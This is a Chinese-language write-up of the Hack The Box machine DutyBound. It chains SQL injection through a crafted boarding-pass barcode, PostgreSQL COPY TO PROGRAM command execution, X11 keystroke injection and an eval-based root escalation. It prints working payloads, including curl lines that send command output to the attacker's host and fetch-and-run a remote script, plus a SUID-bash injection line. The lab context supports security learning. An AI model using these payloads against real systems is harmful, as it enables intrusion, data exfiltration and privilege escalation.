---
title: "HTB DutyBound Writeup"
date: 2026-10-28
draft: false
description: "机场免税自助结账系统：BCBP 登机牌解析器把最后一段的条件数据拼进 PostgreSQL 的 INSERT 语句，注入后 COPY TO PROGRAM 拿到 postgres，再借 X11 按键注入切到 kiosk，最后用 root 定时脚本里的 eval 提权。"
tags: ["HTB", "Linux", "Medium", "PostgreSQL", "SQLi", "X11"]
categories: ["Writeup"]
isStarred: false
---

DutyBound 是一台围绕机场免税店自助结账机搭建的 Linux 靶机。Web 端只做一件事：读登机牌条码（IATA BCBP），据此判断旅客的目的地和免税资格。解析器写得相当严格，但只要构造出合法的多航段登机牌，最后一段的条件数据就会原样拼进 PostgreSQL 的 INSERT 语句，构成注入点。拿到的 postgres 权限可以通过 X11 接管 kiosk 用户的图形会话，而 kiosk 又在一份 root 定时执行的脚本里留下了 eval。

| 项目 | 值 |
| :--- | :--- |
| 平台 | Hack The Box |
| 系统 | Linux |
| 难度 | Medium |
| 靶机 IP | 10.129.20.205 |

## 0. 攻击链总览

先用 IATA BCBP 的格式构造出能通过校验的登机牌，借助双航段让最后一段的条件数据落到数据库插入语句里，用 `COPY … TO PROGRAM` 从 PostgreSQL 拿到 postgres 用户的命令执行；postgres 可以连上 kiosk 用户正在使用的 X 显示，通过 openbox 的 Ctrl+Alt+T 快捷键弹出 xterm 并注入键盘输入，切到 dutyfree-kiosk；kiosk 属于 pos-ops 组，对 root 定时脚本读取的 `duty-rates.csv` 有写权限，脚本对该文件首列的 `eval` 使命令以 root 执行。

### 工具

| 工具 | 用途 |
| :--- | :--- |
| nmap | 端口与服务识别 |
| ffuf | 目录与虚拟主机枚举 |
| curl | 构造并发送 HTTP 请求、回传命令输出 |
| Python 3 | 登机牌构造、X11 按键注入、命令通道 |
| python3-Xlib | 目标机上的 XTest 键盘注入 |

## 1. 侦察

全端口扫描只开放 SSH 与 HTTP：

```console
imawuya:~$ nmap -Pn -n -p- --min-rate 2000 -T4 --open 10.129.20.205
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

版本探测：

```console
imawuya:~$ nmap -Pn -n -sV -sC -p 22,80,443 10.129.20.205
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
```

80 端口无条件跳转到 `https://airsnacks.htb/`，证书 CN 也是 `airsnacks.htb`。把域名写进 hosts 之后访问，得到一个名为 AirSnacks 的自助结账界面。

## 2. 枚举

### 2.1 应用结构

目录与虚拟主机都扫过，没有第二套站点，路由只有以下这些：

| 路由 | 方法 | 说明 |
| :--- | :--- | :--- |
| `/` | GET | 欢迎页 |
| `/browse` | GET | 20 个商品，7 个税类 |
| `/cart` | GET | 购物车，数据存在客户端签名 cookie 里 |
| `/cart/add` | POST JSON | `{"sku": "..."}`，任意 sku 都收 |
| `/cart/update` | POST 表单 | `sku` + `action=inc\|dec\|remove` |
| `/cart/clear` | POST | 清空 |
| `/checkout/boarding-pass` | GET | 扫描登机牌页面 |
| `/checkout/boarding-pass/verify` | POST JSON | `{"raw": "<BCBP>"}` |
| `/checkout/pay` | GET | 固定返回「Payment unavailable」 |
| `/exit` | POST | 清 session |

Session 是 itsdangerous 签名 cookie，内容是 zlib 压缩后的 JSON：

```json
{"cart":{"CNF-JLY-300":1},"cart_id":"c_xxxxxxxx",
 "eligibility":{"audit_ref":"aud_...","dest":"JFK","exempt":false,"regime":"OFF_AIRPORT"}}
```

`/checkout/boarding-pass/verify` 是唯一带业务逻辑的接口，且必须购物车非空，否则先返回 `CART_EMPTY`。

### 2.2 BCBP 登机牌格式

接口把 `raw` 当成 IATA BCBP 条码解析，报错信息会带字段号，靠错误逐层推进就能还原格式。

可用的第一段骨架（57 字符）：

```
M1<姓名 20><E><PNR 7><出发 3><到达 3><承运人 3><航班 5><儒略日 3><舱位 1><座位 4><值机序号 4><旅客状态 1>
```

示例：

```
M1DOE/JOHN            EABC1234LHRJFKB00 0123 123Y012A0001A
```

后面接条件数据：

```
<3 位十进制条件总长> >5 <2 位十六进制长度标记> <条件块>
```

- 长度标记只接受 `0B` / `18` / `25` / `32`（对应 11 / 24 / 37 / 50 字符）
- 条件块内的固定位置（从块首算起）：
  - `3-6` 签发日期，四位数字，`2026` 这类值可以通过
  - `7` 证件类型，`B` 或空白
  - `8-10` 签发航司，必须等于承运人
  - `50-51` item17，取值只能是 `03`、`0D`、`0E`、`0F`、`12`、`15`、`25`、`26`、`29`、`2A`
  - 其余位置（`0-2`、`11-49`）不做校验

条件块的长度不足时 item17 会读越界，报 `leg 1: item 17 not hex`，这是最容易卡住的地方——把块补到 52 位即可。

### 2.3 双航段结构

把第一段做成 `M2` 之后，解析器要求每个后续航段各带一个 65 字符的块，块内布局与第一段完全不同：

| 偏移 | 字段 |
| :--- | :--- |
| 35-37 | 出发机场 |
| 40-42 | 到达机场 |
| 46-50 | 航班号 |
| 51-53 | 儒略日 |
| 54 | 舱位 |
| 55-58 | 座位 |
| 59-62 | 值机序号 |
| 63 | 旅客状态 |

每个航段块之后跟自己的 item17、`>5` 和条件块；最后一段前面要用 **两位十六进制** 写明尾部长度，写错会报 `trailing data: last-leg item 6 declared 36, expected 3A`。

后端返回的 `dest` 取的是 **最后一段** 的目的地，与界面上显示的航段不一致。

## 3. 初始访问

### 3.1 定位注入点

最后一段的条件块内容不是按参数绑定的，而是直接拼进 SQL 字符串。在块的自由区放一个单引号，就能让数据库报语法错误并把语句回显出来：

```console
imawuya:~$ curl -sk -b cj.txt -X POST -H 'Content-Type: application/json' \
    --data-binary @payload.json https://airsnacks.htb/checkout/boarding-pass/verify
{"detail":"syntax error at or near \";\"\nLINE 1: ...'', 241, 'AAAAAAAAAAAAAAAAAAAAAAAAAAA2   2026BB00';--       ..."}
```

确认是字符串拼接后，用 `pg_sleep` 做时间盲注验证，5 秒的延迟稳定复现。

### 3.2 COPY TO PROGRAM 执行命令

PostgreSQL 的 `COPY … TO PROGRAM` 可以直接拉起 shell 命令。用 `')--` 闭合插入语句并注释掉剩余部分，再堆叠一条 COPY：

```
');COPY(SELECT'')TO PROGRAM'sleep 7'--
```

响应耗时从 1.5 秒涨到 8 秒，命令确实以 postgres 身份执行。

为了拿回显，把命令输出 base64 之后放进 URL 请求攻击机的 HTTP 服务，再从访问日志里取：

```
');COPY(SELECT'')TO PROGRAM'curl -s 10.10.17.46:8000/H_$(id|base64 -w0)'--
```

```console
imawuya:~$ tail -1 httpd.log
10.129.20.205 - - "GET /H_dWlkPTExNChwb3N0Z3Jlcyk... HTTP/1.1" 404 -
```

解码得到 `uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)`。

后续为了绕开 payload 长度限制，先落一个转发脚本到 `/tmp/y`，由它负责把参数 base64 解码执行、把结果回传，之后每条命令都走这个通道。

### 3.3 postgres → dutyfree-kiosk

`ps` 显示 kiosk 用户正在跑一个 X 会话（`:0`，800×600），Firefox 全屏开着本站，窗口管理器是 openbox。postgres 可以直接连上这个显示，尽管 `serverauth` 文件对 postgres 不可读。

openbox 的全局配置里有现成的快捷键：

```xml
<keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

目标机装有 `python3-Xlib`，于是用 XTest 注入 Ctrl+Alt+T 弹出 xterm，再逐字符注入下面这条命令：

```bash
curl -s 10.10.17.46:8000/k.sh|sh
```

脚本以 dutyfree-kiosk 身份执行，把 `id` 和 `user.txt` 复制到 `/tmp` 并放开权限：

```console
dutyfree-kiosk@dutybound:~$ id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
```

user flag：`********************************`

## 4. 提权

### 4.1 定位提权点

`/opt/vrs` 下放着 VRS TravelPOS 的部署：应用代码、数据库脚本，以及一个 root 所有、`pos-ops` 组可写的目录 `/opt/vrs/data`。kiosk 正好在 `pos-ops` 组里。

`/opt/vrs/bin/apply-duty-rates.sh` 由 root 执行，读取 `duty-rates.csv` 时对第一列做了 eval：

```bash
while IFS=, read -r tax_class duty_pct vat_pct; do
    ...
    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then exit 1; fi
    eval "${tax_class}=${duty_pct}"
done < "$RATES"
```

只校验了后两列是数字，第一列没有任何限制。触发方式是 systemd 的 path unit `vrs-duty-apply.path`，文件一改就拉起 service。

### 4.2 写入 payload

以 kiosk 身份往 CSV 追加一行，用命令替换把 bash 复制成 SUID：

```bash
echo '$(cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb),1,1' >> /opt/vrs/data/duty-rates.csv
```

几秒后文件出现：

```console
postgres@dutybound:~$ ls -la /tmp/rb
-rwsr-xr-x 1 root root 1396520 /tmp/rb
```

用 postgres 的通道执行即可拿到 root：

```console
postgres@dutybound:~$ /tmp/rb -p -c 'id; cat /root/root.txt'
uid=114(postgres) gid=121(postgres) euid=0(root) ...
```

root flag：`********************************`

## 5. 收尾

按交付要求恢复现场：

```bash
# 以 root（SUID bash）还原被改动的 CSV，去掉注入行
/tmp/rb -p -c "sed -i '/cp \/bin\/bash/d' /opt/vrs/data/duty-rates.csv && chown root:pos-ops /opt/vrs/data/duty-rates.csv && chmod 664 /opt/vrs/data/duty-rates.csv"
# 清理落地文件
/tmp/rb -p -c "rm -f /tmp/rb /tmp/u /tmp/whoami /tmp/x /tmp/y /tmp/i.py /tmp/z.py /tmp/s.txt /tmp/t.txt /tmp/vrs.txt /tmp/d.txt /tmp/ls.txt /tmp/sudo.txt /tmp/r.txt"
```

本地侧关闭监听、断开 VPN，删除 hosts 记录。

本次操作中，靶机实例在收尾命令执行前已到期回收，上述恢复步骤记录了应当执行的顺序，实际只完成了 CSV 的 sed 还原。

## 附录：走过的弯路与兔子洞

- **VPN 段选错**。一开始用 AU 的配置连，靶机所在网络是 US Release Arena，边界网关直接回「无法访问目标主机」，全端口 filtered。换配置后才通。
- **item17 卡了很久**。一直以为是某个字段取值不对，其实条件块必须至少有 52 字符，否则 item17 会读到块外，报 `leg 1: item 17 not hex`。补足长度后立刻通过。
- **isseur 校验**。尝试过几十个真实航司代码想命中「联运伙伴」白名单，实际白名单里只有承运人自己，把签发航司设成与承运人相同即可。
- **exempt 与 regime 是死值**。试过 100 多个机场与国家代码、舱位、座位、旅客状态、商品类别、item17 的全部取值、双航段组合，`OFF_AIRPORT` / `false` 从未变过，这条路走不通——真正的入口是条件块内容的 SQL 注入。
- **过早尝试注入**。在条件块的固定字段上试单引号没有任何反应，因为那些位置要么有格式校验，要么不参与拼接；真正生效的是 item17 之后（块 52 位以后）以及 0-18 区间的自由数据。
- **密钥爆破是死路**。Flask 的 session 密钥和 JWT 的 HS256 密钥都用完整 rockyou 跑过，都不在里面，密钥是随机值。
- **反弹 shell 没通**。从 postgres 直接往回连 4444 端口没有成功，改用「命令结果经 HTTP 回传」的方式，反而更稳，也更容易在日志里留痕。
- **多航段的比例陷阱**。第二段块是 65 字符而不是第一段的 27 字符，且最后一段的长度字段是十六进制而非十进制，照着第一段的规律硬套会一直报截断。
